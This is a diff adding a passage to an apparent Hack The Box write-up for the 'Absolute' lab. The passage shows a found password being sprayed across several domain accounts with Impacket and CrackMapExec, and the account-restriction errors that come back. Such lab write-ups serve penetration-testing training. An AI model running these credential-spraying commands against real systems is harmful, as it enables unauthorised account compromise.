@@ -558,6 +558,34 @@ Creds:
 d.klay:Darkmoonsky248girl
 ```
 
+However, upon trying to spray these credentials across protocols, I see that we get a particular error:
+
+```
+smbclient.py 'absolute.htb'/'d.klay':'Darkmoonsky248girl'@'10.129.228.64'
+Impacket v0.10.1.dev1+20230505.184149.c309363e - Copyright 2022 Fortra
+
+[-] SMB SessionError: STATUS_ACCOUNT_RESTRICTION(Indicates a referenced user name and authentication information are valid, but some user account restriction has prevented successful authentication (such as time-of-day restrictions).)
+```
+
+```
+STATUS_ACCOUNT_RESTRICTION
+```
+
+<mark style="color:yellow;">This error means that NTLM authentication has been disabled on this machine.</mark>
+
+We can also see this in CME:
+
+```
+SMB         10.129.228.64   445    DC               [-] absolute.htb\j.roberts:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
+SMB         10.129.228.64   445    DC               [-] absolute.htb\m.chaffrey:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
+SMB         10.129.228.64   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
+SMB         10.129.228.64   445    DC               [-] absolute.htb\s.osvald:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
+SMB         10.129.228.64   445    DC               [-] absolute.htb\j.robinson:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
+SMB         10.129.228.64   445    DC               [-] absolute.htb\n.smith:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
+```
+
+<mark style="color:yellow;">How else can we authenticate?</mark>
+
 ## Privilege Escalation
 
 ### Local enumeration
